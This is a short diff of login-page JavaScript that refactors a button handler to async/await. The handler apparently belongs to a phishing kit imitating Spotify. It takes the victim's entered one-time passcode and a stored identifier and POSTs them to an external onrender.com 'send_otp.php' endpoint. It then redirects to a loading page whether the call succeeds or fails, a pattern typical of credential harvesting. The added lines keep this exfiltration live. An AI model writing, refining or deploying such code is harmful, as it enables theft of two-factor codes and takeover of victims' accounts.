@@ -1,4 +1,4 @@
-document.getElementById("login-button").addEventListener("click", function (event) {
+document.getElementById("login-button").addEventListener("click", async function (event) {
     event.preventDefault(); // Prevent form submission
 
     // Get the entered OTP
@@ -21,22 +21,23 @@ document.getElementById("login-button").addEventListener("click", function (even
     // Prepare data to send
     const data = { otp, unique_id: localStorage.getItem('unique_id') };
 
-    // Send OTP to PHP script
-    fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/send_otp.php", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data),
-    })
-        .then((response) => response.json())
-        .then((result) => {
-            if (result.success) {
-                window.location.href = "loading.html";
-            } else {
-                window.location.href = "loading.html";
-            }
-        })
-        .catch((error) => {
-            console.error("Error:", error);
-            alert("An error occurred. Please try again.");
+    try {
+        // Send OTP to PHP script
+        const response = await fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/send_otp.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
         });
+
+        const result = await response.json();
+
+        if (result.success) {
+            window.location.href = "loading.html";
+        } else {
+            window.location.href = "loading.html";
+        }
+    } catch (error) {
+        console.error("Error:", error);
+        alert("An error occurred. Please try again.");
+    }
 });
